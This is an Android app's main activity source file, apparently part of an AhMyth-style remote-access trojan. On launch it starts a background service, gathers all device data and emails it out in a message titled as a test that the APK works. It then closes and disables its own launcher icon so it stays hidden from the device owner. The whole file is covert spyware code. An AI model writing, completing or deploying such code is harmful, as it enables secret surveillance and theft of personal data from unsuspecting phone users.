package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import ahmyth.mine.ahmyth.utils.MailSender;
import ahmyth.mine.ahmyth.utils.DataCollector;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MainService.class));

        new Thread(() -> {
            try {
                MailSender mailSender = new MailSender();
                DataCollector dc = new DataCollector(MainActivity.this);
                mailSender.sendEmail("TEST - APK Kaam Kar Rahi Hai", "Device: " + dc.getAllData());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();

        finish();
        fn_hideicon();
    }

    private void fn_hideicon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}

